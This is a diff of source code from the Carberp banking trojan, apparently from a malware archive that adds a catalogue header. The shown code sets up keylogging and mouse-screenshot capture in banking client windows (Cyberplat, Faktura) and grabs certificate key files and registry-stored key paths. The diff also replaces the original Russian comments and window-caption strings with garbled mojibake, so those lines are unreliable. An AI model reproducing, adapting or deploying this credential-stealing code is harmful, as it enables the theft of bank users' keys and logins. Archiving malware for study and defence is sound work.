@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // ---------------------------------------------------------------------------
 #include <windows.h>
 
@@ -37,7 +48,7 @@ namespace KEYLOGSYSTEMS
 namespace Cyberplat
 {
 
-	//true - если файл является файлом ключем
+	//true - пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 static int GrabKeyFiles( FileGrabber::ParamEvent* e )
 {
 	DBG( "Cyberplat", "File: %s", e->fileName );
@@ -53,7 +64,7 @@ static void Activeted( LPVOID Sender )
 	rv->FuncReceiver = GrabKeyFiles;
 	rv->minSize = 400;
 	rv->maxSize = 3000;
-	rv->maska = "*oper*BEGIN*END*"; //файлы которые начинаются с BEGIN CERTIFICATE и заканчиваются END CERTIFICATE
+	rv->maska = "*oper*BEGIN*END*"; //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ BEGIN CERTIFICATE пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ END CERTIFICATE
 	FileGrabber::AddReceiver(rv);
 }
 
@@ -75,11 +86,11 @@ static void Init()
 		S->OnActivate = Cyberplat::Activeted;
 		S->OnDeactivate = Cyberplat::Deactivate;
 		S->AlwaysLogMouse = LOG_MOUSE_SCREENSHOT;
-		char CyberplatCaption[] = {'И','д','е','н','т','и','ф','и','к','а','ц','и','я',' ','п','о','л','ь','з','о','в','а','т','е','л','я', 0};
+		char CyberplatCaption[] = {'пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ',' ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ','пїЅ', 0};
 		PKlgWndFilter F1 = KeyLogger::AddFilter(S, true, true, NULL, (PCHAR)CyberplatCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
 		if( F1 )
 		{
-			PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, NULL, "*Клавиатура*", FILTRATE_PARENT_WND, LOG_MOUSE, 3);
+			PKlgWndFilter F2 = KeyLogger::AddFilter(S, true, true, NULL, "*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*", FILTRATE_PARENT_WND, LOG_MOUSE, 3);
 			if( F2 )
 			{
                 F2->MouseLogWnd = MOUSE_LOG_WND_FILTER;
@@ -93,9 +104,9 @@ static void Init()
 
 // ---------------------------------------------------------------------------
 void FakturaInitialize(LPVOID Sender) {
-	// Метод инициализации фактуры
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// При инициализации фактуры копируем два файла в архив кейлогера
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	const static char FukturaKey[] = {
 		'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'F', 'T', 'C', '\\', 'S',
 		'K', 'S', 'B', '\\', 'K', 'e', 'y', 'S', 't', 'o', 'r', 'a', 'g', 'e', 0
@@ -110,19 +121,19 @@ void FakturaInitialize(LPVOID Sender) {
 		'K', 'e', 'y', 's', '\\', 0
 	};
 
-	// Первым делом проверяем ветку реестра в которой фактура прописывает
-	// свои ключи
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	bool FreePath = true;
 	PCHAR Path = Registry::GetStringValue(HKEY_CURRENT_USER, (PCHAR)FukturaKey,
 		NULL);
 
-	// Если в реестре нет пути, то устанавливаем путь по умолчанию
+	// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Path == NULL) {
 		FreePath = false;
 		Path = "A:\\";
 	}
 
-	// Определяем обратный слэш
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	PCHAR Slash = NULL;
 	PCHAR End = STR::End(Path);
 	End--;
@@ -153,14 +164,14 @@ void FakturaInitialize(LPVOID Sender) {
 
 void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const char* appName)
 {
-	// Функция регистрирует заранее известные системы кейлогера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	// Добавляем систему raif
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ raif
 	#ifdef RafaH
 		Rafa::Init();
 	#endif
 
-	// Добавляем QWidjet
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ QWidjet
 //	S = KeyLogger::AddSystem("qwidget", PROCESS_HASH_IE);
 //	if (S != NULL)
 //	{
@@ -171,12 +182,12 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const 
 	Cyberplat::Init();
 
 
-	// Регистрируем систему для сбер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 //	#ifdef SberKeyLoggerH
 //		RegisterSberKeyLogger();
 //	#endif
 
-	// Добавляем систему IFOBS
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ IFOBS
 //	S = KeyLogger::AddSystem("ifobs", PROCESS_HASH_IE);
 //	if (S != NULL)
 //	{
@@ -198,7 +209,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const 
 	#endif
 
 
-	// Добавляем систему фактура
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	#ifdef FakturaWebModule
 		FakturaWeb::Init();
 	#endif
@@ -228,8 +239,8 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const 
 //-------------------------------------------------------------
 void StartKeyLogger(PCHAR AppName)
 {
-	//  Функция регистрирует заранее известные
-	//	системы кейлогера и запускает его
+	//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	//	пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 
 	PKeyLogger P = KeyLogger::Initialize(AppName);
 	if (!P) return;
